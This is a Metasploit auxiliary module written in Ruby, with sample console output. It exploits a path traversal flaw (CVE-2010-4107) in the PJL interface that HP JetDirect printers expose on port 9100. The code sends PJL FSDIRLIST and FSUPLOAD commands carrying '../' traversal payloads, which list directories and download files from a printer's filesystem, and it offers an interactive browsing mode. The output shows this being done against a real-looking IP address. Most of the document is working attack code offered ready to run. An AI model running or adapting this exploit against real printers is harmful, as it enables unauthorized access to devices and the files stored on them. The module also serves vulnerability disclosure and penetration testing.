# Exploit Title: HP JetDirect PJL Interface Universal Path Traversal
# Date: Aug 7, 2011
# Author: Myo Soe <YGN Ethical Hacker Group - http://yehg.net/>
# Software Link: http://www.hp.com
# Version: All
# Tested on: HP LaserJet Pxxxx Series

##
# $Id: $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Sample Output:
#
#
# msf auxiliary(hp_printer_pjl_traversal) > show options
#
# Module options (auxiliary/admin/hp_printer_pjl_traversal):
#
#    Name         Current Setting  Required  Description
#    ----         ---------------  --------  -----------
#    INTERACTIVE  false            no        Enter interactive mode [msfconsole Only]
#    RHOST        202.138.16.21    yes       The target address
#    RPATH        /                yes       The remote filesystem path to browse or read
#    RPORT        9100             yes       The target port
#
#
# msf auxiliary(hp_printer_pjl_traversal) > run
#
# [*] cd / ...
# [+] Server returned the following response:
#
# . TYPE=DIR
# .. TYPE=DIR
# bin TYPE=DIR
# usr TYPE=DIR
# etc TYPE=DIR
# hpmnt TYPE=DIR
# hp TYPE=DIR
# lib TYPE=DIR
# dev TYPE=DIR
# init TYPE=FILE SIZE=9016
# .profile TYPE=FILE SIZE=834
# tmp TYPE=DIR
#
#
# msf auxiliary(hp_printer_pjl_traversal) > set INTERACTIVE true
# INTERACTIVE => true
# msf auxiliary(hp_printer_pjl_traversal) > set RPATH /hp
# RPATH => /hp
# msf auxiliary(hp_printer_pjl_traversal) > run
#
# [*] Entering interactive mode ...
# [*] cd /hp ...
# [+] Server returned the following response:
#
# . TYPE=DIR
# .. TYPE=DIR
# app TYPE=DIR
# lib TYPE=DIR
# bin TYPE=DIR
# webServer TYPE=DIR
# images TYPE=DIR
# DemoPage TYPE=DIR
# loc TYPE=DIR
# AsianFonts TYPE=DIR
# data TYPE=DIR
# etc TYPE=DIR
# lrt TYPE=DIR
#
# [*] Current RPATH: /hp
# [*] -> 'quit' to exit
# [*] ->'/' to return to file system root
# [*] ->'..' to move up to one directory
# [*] ->'!r FILE' to read FILE on current directory
#
# [*] Enter RPATH:
# $ > webServer/config
# [*] cd /hp/webServer/config ...
# [+] Server returned the following response:
#
# . TYPE=DIR
# .. TYPE=DIR
# soe.xml TYPE=FILE SIZE=23615
# version.6 TYPE=FILE SIZE=45
#
#
# [*] Current RPATH: /hp/webServer/config
# [*] -> 'quit' to exit
# [*] ->'/' to return to file system root
# [*] ->'..' to move up to one directory
# [*] ->'!r FILE' to read FILE on current directory
#
# [*] Enter RPATH:
# $ > !r version.6
# [*] cat /hp/webServer/config/version.6 ...
# [+] Server returned the following response:
#
# WebServer directory version.  Do not delete!
#
#
# [*] Current RPATH: /hp/webServer/config
# [*] -> 'quit' to exit
# [*] ->'/' to return to file system root
# [*] ->'..' to move up to one directory
# [*] ->'!r FILE' to read FILE on current directory
#
# [*] Enter RPATH:
# $ > quit
# [*] Exited ... Have fun with your Printer!
# [*] Auxiliary module execution completed



require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp

	def initialize(info={})
		super(update_info(info,
			'Name'        => 'HP JetDirect PJL Interface Universal Path Traversal',
			'Version'     => '$Revision: 1 $',
			'Description'	=> %q{
				This module exploits path traveresal issue in possibly all HP network-enabled printer series, especially those which enable Printer Job Language (aka PJL) command interface through the default JetDirect port 9100.
				With the decade-old dot-dot-slash payloads, the entire printer file system can be accessed or modified.
			},
			'Author'      => [
					'Moritz Jodeit <http://www.nruns.com/>', # Bug Discoverer
					'Myo Soe <YGN Ethical Hacker Group, http://yehg.net/>' # Metasploit Module
					],
			'License'     => MSF_LICENSE,
			'References'     =>
			[
				[ 'CVE', '2010-4107' ],
				[ 'URL', 'http://www.nruns.com/_downloads/SA-2010%20003-Hewlett-Packard.pdf' ],
				[ 'URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02004333' ],
				[ 'URL', 'http://www.irongeek.com/i.php?page=security/networkprinterhacking' ],
				[ 'URL', 'https://github.com/urbanadventurer/WhatWeb/blob/master/plugins/HP-laserjet-printer.rb' ],
				[ 'URL', 'https://github.com/urbanadventurer/WhatWeb/blob/master/plugins/HP-OfficeJet-Printer.rb' ],
				[ 'URL', 'http://core.yehg.net/lab/#tools.exploits' ]
			],
			'DisclosureDate' => '2010-11-15'))

		register_options(
		[

			OptString.new('RPATH',
					[
						true,
						"The remote filesystem path to browse or read",
						"/"
					]
				),
			OptBool.new('INTERACTIVE',
								[
									false,
									"Enter interactive mode [msfconsole Only]",
									false
								]
							),

			Opt::RPORT(9100)
		],self.class)


	end

	def run
		mode = datastore['INTERACTIVE']

		if mode	== true
			set_interactive(datastore['RPATH'])
		else
			set_onetime(datastore['RPATH'])
		end
	end

	def set_interactive(spath)
		action = 'DIR'
		rpath =  spath
		rfpath = ''
		tmp_path = ''
		tmp_file = ''
		cur_dir = '/'

		print_status("Entering interactive mode")
		stop = false

		set_onetime(rpath)

		until stop == true
			print_status("Current RPATH: #{rpath}")
			print_status("-> 'quit' to exit")
			print_status("->'/' to return to file system root")
			print_status("->'..' to move up to one directory")
			print_status("->'!r FILE' to read FILE on current directory\r\n")
			print_status("Enter RPATH:")
			print("$ > ")

			tmp_path = gets.chomp.to_s


			if tmp_path =~ /\.\./ && rpath.length > 2
				old_path = rpath
				new_path = rpath[0,rpath.rindex('/')]
				if new_path != nil
					rpath = new_path
				else
					rpath = '/'
				end
				rpath = '/' if rpath.length == 0
				print_status("Change to one up directory: #{rpath}")
			elsif tmp_path =~ /\!r\s/
				cur_dir = rpath
				tmp_file = tmp_path.gsub('!r ','')
				rfpath = cur_dir + '/' + tmp_file
				rfpath = rfpath.gsub('//','/')
				action = 'FILE'

			elsif tmp_path == '/'
				rpath = '/'
			elsif rpath != '/'
			   	rpath = rpath + '/' << tmp_path
			else
				rpath = rpath  << tmp_path
			end
			if rpath =~ /quit/
				stop= true
				rpath = '/'
				print_status("Exited ... Have fun with your Printer!")
			else
				rpath = rpath.gsub('//','/')
				if action == 'FILE'
					set_onetime(rfpath,action)
					cur_dir = rpath
				else
					set_onetime(rpath,action)
				end
				action = 'DIR'
			end
		end
	end

	def set_onetime(spath,saction =  datastore['ACTION'])

		rpathx  = spath
		action = saction
		rpathx = '/' if rpathx =~ /\/quit/

		connect

		dir_cmd = "\x1b%-12345X@PJL FSDIRLIST NAME=\"0:/../../../[REPLACE]\" ENTRY=1 COUNT=99999999\x0d\x0a\x1b%-12345X\x0d\x0a"
		file_cmd = "\x1b%-12345X@PJL FSUPLOAD NAME=\"0:/../../../[REPLACE]\" OFFSET=0 SIZE=99999999\x0d\x0a\x1b%-12345X\x0d\x0a"

		if action =~ /DIR/
			r_cmd = dir_cmd.sub("[REPLACE]",rpathx)
			print_status("cd #{rpathx} ...")
		else
			r_cmd = file_cmd.sub("[REPLACE]",rpathx)
			print_status("cat #{rpathx} ...")
		end



		recv = sock.put(r_cmd)
		res = sock.get(-1,1)

		if (!res)
			print_error("ERROR in receiving data!\r\n")
		else
			if res.to_s =~ /ERROR/
				print_error("Operation Not Permitted or File/DIR Not Found!\r\n")
				disconnect
				return
			end
			resx = res.to_s[res.index("\r\n")+1,res.length]
			print_good("Server returned the following response:\r\n#{resx}")
		end

		disconnect

	end


end